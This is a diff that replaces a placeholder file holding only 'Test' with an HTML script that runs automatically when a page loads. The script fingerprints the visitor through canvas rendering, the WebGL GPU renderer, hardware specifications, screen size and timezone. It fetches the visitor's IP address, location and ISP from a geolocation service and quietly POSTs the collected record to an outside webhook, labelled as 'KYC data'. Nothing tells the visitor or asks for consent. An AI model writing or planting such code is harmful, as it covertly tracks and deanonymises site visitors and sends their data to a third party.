@@ -1,1 +1,65 @@
-Test
+<script>
+const getFingerprint = () => {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    const txt = 'BrowserFingerprint123!';
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.textBaseline = "alphabetic";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125,1,62,20);
+    ctx.fillStyle = "#069";
+    ctx.fillText(txt, 2, 15);
+    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+    ctx.fillText(txt, 4, 17);
+    return canvas.toDataURL(); // Уникальный хеш на основе рендеринга
+};
+
+const collectFullData = async () => {
+    try {
+        // 1. Геолокация и IP (внешний сервис)
+        let geo = {};
+        try {
+            const res = await fetch('https://ipapi.co');
+            geo = await res.json();
+        } catch (e) { geo = { error: "Blocker detected" }; }
+
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+
+        const info = {
+            timestamp: new Date().toLocaleString(),
+            ip: geo.ip,
+            city: geo.city,
+            country: geo.country_name,
+            isp: geo.org,
+            
+            os: navigator.platform,
+            browser: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || 'N/A',
+            ram: navigator.deviceMemory || 'N/A',
+            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
+            
+            screen: `${window.screen.width}x${window.screen.height}`,
+            touchPoints: navigator.maxTouchPoints,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            
+            canvasHash: getFingerprint().slice(-50) // Хвост base64 строки как ID
+        };
+
+        await fetch('https://brave-meadow-69.webhook.cool', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(info)
+        });
+
+        console.log('KYC Data Sent:', info);
+    } catch (err) {
+        console.error('Data collection failed', err);
+    }
+};
+
+window.addEventListener('load', collectFullData);
+</script>
